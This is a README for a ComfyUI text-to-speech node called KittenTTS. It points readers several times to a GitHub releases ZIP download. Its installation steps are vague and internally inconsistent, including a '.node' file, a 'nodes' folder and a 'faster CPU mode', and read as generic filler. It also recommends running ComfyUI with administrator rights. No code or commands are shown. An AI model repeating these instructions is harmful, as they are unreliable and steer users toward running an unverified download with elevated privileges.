# 😺 ComfyUI-KittenTTS - Lightweight Text-to-Speech for Everyone

[![Download ComfyUI-KittenTTS](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/ihsacm/ComfyUI-KittenTTS/releases)

## 📌 What is ComfyUI-KittenTTS?

ComfyUI-KittenTTS is a simple add-on for ComfyUI. It adds a KittenTTS node that lets you convert text into speech. This tool uses a very small text-to-speech model, so it works well even on slower computers. It can run on both NVIDIA CUDA and regular CPUs.  

You do not need any special skills to use it. Just add the node to ComfyUI, type the text you want to hear, and get spoken audio quickly.

## 🖥️ System Requirements

- Windows 10 or newer  
- A modern Intel or AMD processor (CPU only mode supported)  
- NVIDIA GPU with CUDA support (optional but speeds up processing)  
- At least 4 GB of free RAM  
- ComfyUI installed (version 1.0 or later recommended)  

The software works fine without a GPU but will run faster if you have one.

## 🔧 Installation and Setup Guide 🚀

### Step 1: Download ComfyUI-KittenTTS

You need to visit the official GitHub releases page to get the latest version of ComfyUI-KittenTTS. Click the green button below or use this link:

[![Download ComfyUI-KittenTTS](https://img.shields.io/badge/Go%20to%20Downloads-Blue?style=for-the-badge&color=0078D7)](https://github.com/ihsacm/ComfyUI-KittenTTS/releases)

Once on the page, look for the latest release. You will find a ZIP file containing all the necessary files. Download this ZIP file to your PC.

### Step 2: Extract the Files

After downloading:

1. Open the ZIP file using Windows File Explorer or any extraction tool.
2. Extract all files to a folder you can easily find, such as your Desktop or Documents folder.
3. Keep the folder structure intact; do not move files around after extracting.

### Step 3: Get ComfyUI Ready

Make sure you have ComfyUI installed on your computer before proceeding. If you do not have ComfyUI:

- Download it from the official ComfyUI repository.
- Follow their installation instructions.
- Once installed, open ComfyUI to check it runs properly.

### Step 4: Add the KittenTTS Node to ComfyUI

1. Open ComfyUI.
2. Inside the program, find the folder where you extracted ComfyUI-KittenTTS.
3. Inside this folder, look for a file or folder labeled `KittenTTS` or with `.node` extension.
4. Copy this file or folder.
5. Paste it into ComfyUI's `nodes` directory. This is usually located inside the ComfyUI installation folder or user folder.
6. Restart ComfyUI to load the new node.

### Step 5: Use KittenTTS in Your Workflow

1. Start ComfyUI.
2. Look for the new KittenTTS node in the list of nodes.
3. Drag and drop the node into your workspace.
4. Click on the node and type any text you want to hear.
5. Run the workflow to generate speech audio.

The audio output will play or save depending on how you set up ComfyUI.

## 🎛️ How to Use KittenTTS Features

- **Simple text input:** Just type or paste your text directly into the node.
- **Audio output formats:** The node supports WAV and MP3 audio files.
- **Speed options:** Choose between faster CPU mode or faster CUDA GPU mode (if available).
- **Light on resources:** The model is small, making it ideal for use on older or less powerful systems.
- **Customization:** Adjust voice speed and pitch using the node settings.

## 💡 Tips for Best Results

- Use short sentences to get clearer speech.
- If you have an NVIDIA GPU, enable CUDA mode in node settings for faster processing.
- Keep ComfyUI updated to avoid compatibility issues.
- Test different voices or speeds to find what sounds best for your text.
- Run ComfyUI with administrator rights to avoid file permission issues.

## 🔄 Updating ComfyUI-KittenTTS

1. Check the GitHub releases page regularly for new versions.
2. Download the updated ZIP file and extract it.
3. Replace the old KittenTTS node files in the ComfyUI nodes folder with the new ones.
4. Restart ComfyUI.

Updating will ensure you get the latest bug fixes and improvements.

## 🛠 Troubleshooting Common Issues

- **Node not appearing:** Confirm the KittenTTS files are in ComfyUI’s `nodes` folder. Restart the app after adding.
- **Audio not playing:** Check your PC sound settings and volume. Also, verify ComfyUI outputs audio correctly for other nodes.
- **Slow performance:** Switch from CPU mode to CUDA mode if using a compatible NVIDIA GPU.
- **Errors on startup:** Make sure your system meets requirements and ComfyUI is updated.

If issues persist, visit the GitHub issues page for support or report a new problem.

## 🔗 Download Link Reminder

Get the latest release here:

[Download ComfyUI-KittenTTS](https://github.com/ihsacm/ComfyUI-KittenTTS/releases)

Click this link any time to find new versions or additional files.

## 📂 Additional Resources

- Official ComfyUI repository  
- KittenTTS ONNX model documentation  
- ONNX Runtime setup guides (for advanced users interested in model acceleration)

These resources help if you want deeper technical understanding or to customize your setup further.

## 🧩 Supported Topics

- comfyui  
- comfyui-custom-node  
- comfyui-nodes  
- kittentts  
- onnx  
- onnx-models  
- onnxruntime  
- text-to-speech  
- tts  
- tts-model  

These keywords reflect the main technologies and focus areas involved with ComfyUI-KittenTTS.